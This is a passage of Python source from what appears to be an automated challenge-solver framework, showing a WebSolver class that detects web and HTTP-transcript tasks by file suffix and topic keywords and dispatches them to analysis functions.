        result.error = f"{type(exc).__name__}: {exc}"
        result.steps.append(
            {"name": "source-to-template-flow", "status": "error", "details": {"error": result.error, "executed": False}}
        )
    return result


class WebSolver:
    name = "universal-web"
    category = "web"

    def detect(self, context: SolverContext) -> Detection | None:
        suffix = context.input_path.suffix.lower()
        task = (context.task_text or "").lower()
        if suffix in {".har", ".http", ".curl", ".http.txt", ".json", ".log", ".txt"} or any(word in task for word in ("http", "web", "api", "wordpress", "jwt", "oauth", "graphql", "csrf", "sqli")):
            try:
                prefix = context.input_path.read_bytes()[:256].lower()
            except OSError:
                prefix = b""
            if any(marker in prefix for marker in (b"http/", b"curl ", b'"log"', b'"request"', b'"url"')) or any(word in task for word in ("http", "web", "api")):
                return Detection(self.name, self.category, 75, "saved HTTP/API transcript hint", {"suffix": suffix})
        return None

    def solve(self, context: SolverContext) -> SolverResult:
        if context.input_path.suffix.lower() in {".js", ".mjs", ".ts", ".py"}:
            source_result = analyze_web_source(context)
            if source_result.status != "unsupported":
                return source_result
        return analyze_web_transcript(context)
